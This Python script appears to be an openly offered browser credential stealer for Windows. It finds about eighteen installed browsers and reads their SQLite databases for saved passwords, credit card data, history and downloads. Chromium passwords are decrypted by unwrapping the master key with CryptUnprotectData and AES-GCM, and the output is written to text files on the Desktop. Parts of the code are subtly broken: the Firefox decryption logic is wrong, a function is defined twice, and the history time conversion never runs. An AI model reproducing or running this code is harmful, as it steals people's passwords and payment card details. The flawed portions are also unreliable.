import base64
import json
import os
import shutil
import sqlite3
import time
from datetime import datetime, timedelta

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

appdata = os.getenv('LOCALAPPDATA')

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'firefox': os.path.join(os.getenv('APPDATA'), 'Mozilla\\Firefox\\Profiles')
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}

def get_firefox_profile_path():
    appdata = os.getenv('APPDATA')
    mozilla_path = os.path.join(appdata, 'Mozilla\\Firefox\\Profiles')

    if os.path.exists(mozilla_path):
        profiles = [f for f in os.listdir(mozilla_path) if os.path.isdir(os.path.join(mozilla_path, f))]
        if profiles:
            return os.path.join(mozilla_path, profiles[0])

    return None


def get_firefox_key(profile_path: str):
    try:
        key4file = os.path.join(profile_path, 'key4.db')
        conn = sqlite3.connect(key4file)
        cursor = conn.cursor()
        cursor.execute('SELECT item1, item2 FROM metadata WHERE id = "password";')
        for row in cursor.fetchall():
            if row[0] == 'password' and row[1] == 'password-check':
                cursor.execute('SELECT a11, a102 FROM nssPrivate;')
                return cursor.fetchone()
    except Exception as e:
        print(f"Error retrieving Firefox key: {e}")
    finally:
        if cursor:
            cursor.close()
        if conn:
            conn.close()

    return None

def get_firefox_logins(profile_path: str, key: bytes):
    logins_file = os.path.join(profile_path, 'logins.json')
    if os.path.exists(logins_file):
        with open(logins_file, 'r', encoding='utf-8') as f:
            logins_data = json.load(f)
            logins = logins_data.get('logins', [])
            result = ""
            for login in logins:
                url = login.get('hostname', '')
                username = login.get('encryptedUsername', '')
                password = login.get('encryptedPassword', '')
                decrypted_username = decrypt_firefox_password(base64.b64decode(username), key)
                decrypted_password = decrypt_firefox_password(base64.b64decode(password), key)
                result += f"URL: {url}\nUsername: {decrypted_username}\nPassword: {decrypted_password}\n\n"
            return result
    return ""

def decrypt_firefox_password(encrypted_pass: bytes, key: bytes):
    try:
        if encrypted_pass is None or key is None:
            return None

        # The first 32 bytes of the encrypted password are the initialization vector
        iv = encrypted_pass[:32]
        # The actual encrypted password starts from the 32nd byte
        payload = encrypted_pass[32:]
        # Use AES decryption with CBC mode and PKCS#7 padding
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_pass = cipher.decrypt(payload)
        # Remove PKCS#7 padding
        decrypted_pass = decrypted_pass.rstrip(b'\x00')
        # Decode the decrypted password as UTF-8
        return decrypted_pass.decode('utf-8', errors='replace')
    except Exception as e:
        print(f"Error decrypting Firefox password: {e}")
    return None


def get_firefox_logins(profile_path: str, key: bytes):
    logins_file = os.path.join(profile_path, 'logins.json')
    if os.path.exists(logins_file):
        with open(logins_file, 'r', encoding='utf-8') as f:
            logins_data = json.load(f)
            logins = logins_data.get('logins', [])
            result = ""
            for login in logins:
                url = login.get('hostname', '')
                username = login.get('encryptedUsername', '')
                password = login.get('encryptedPassword', '')
                decrypted_username = decrypt_firefox_password(base64.b64decode(username), key)
                decrypted_password = decrypt_firefox_password(base64.b64decode(password), key)
                result += f"URL: {url}\nUsername: {decrypted_username}\nPassword: {decrypted_password}\n\n"
            return result
    return ""

def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key


def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)

    try:
        # Try decoding with 'utf-8' and replace or ignore invalid characters
        decrypted_pass = decrypted_pass[:-16].decode('utf-8', errors='replace')
    except UnicodeDecodeError:
        # If 'utf-8' decoding fails, replace or ignore invalid characters using 'latin-1'
        decrypted_pass = decrypted_pass[:-16].decode('latin-1', errors='replace')

    return decrypted_pass


def save_results(browser_name, type_of_data, content):
    desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
    browser_folder = os.path.join(desktop_path, browser_name)

    if not os.path.exists(browser_folder):
        os.mkdir(browser_folder)

    if content is not None:
        output_file_path = os.path.join(browser_folder, f'{type_of_data}.txt')
        with open(output_file_path, 'w', encoding="utf-8") as file:
            file.write(content)
        print(f"\t [*] Saved in {output_file_path}")
    else:
        print(f"\t [-] No Data Found!")


def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return ""
    result = ""

    conn = None
    cursor = None
    retries = 2  # Set the maximum number of retries

    try:
        # Retry mechanism with a maximum of 2 retries
        for _ in range(retries):
            try:
                conn = sqlite3.connect(db_file)
                cursor = conn.cursor()
                cursor.execute(type_of_data['query'])

                for row in cursor.fetchall():
                    row = list(row)
                    if type_of_data['decrypt']:
                        for i in range(len(row)):
                            if isinstance(row[i], bytes):
                                try:
                                    row[i] = decrypt_password(row[i], key)
                                except UnicodeDecodeError:
                                    row[i] = "Unable to decode"
                    if type_of_data['columns'][0] == 'last_visit_time':
                        if row[2] != 0:
                            row[2] = convert_chrome_time(row[2])
                        else:
                            row[2] = "0"
                    result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"

                break  # Break the loop if successful
            except sqlite3.OperationalError as e:
                print(f"SQLite Error: {e}")
                if "database is locked" in str(e):
                    print("Retrying...")
                    time.sleep(1)  # Wait for 1 second before retrying
                else:
                    print("Skipping to the next browser...")
                    break  # Skip to the next browser if the error is not a lock issue
            except Exception as e:
                print(f"An unexpected error occurred: {e}")
                print("Skipping to the next browser...")
                break  # Skip to the next browser in case of unexpected errors

    except sqlite3.Error as e:
        print(f"SQLite Error: {e}")
        print(f"Problematic Data: {row}")
    finally:
        if cursor:
            cursor.close()
        if conn:
            conn.close()

    return result


def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')


def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available


def main():
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = None

        print(f"Getting Stored Details from {browser}")

        if browser == 'firefox':
            profile_path = get_firefox_profile_path()
            if profile_path:
                master_key = get_firefox_key(profile_path)
            else:
                print("Firefox profile not found.")
                continue

        else:
            master_key = get_master_key(browser_path)

        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
            if browser == 'firefox':
                data = get_firefox_logins(profile_path, master_key)
            else:
                data = get_data(browser_path, "Default", master_key, data_type)

            save_results(browser, data_type_name, data)
            print("\t------\n")

if __name__ == '__main__':
    main()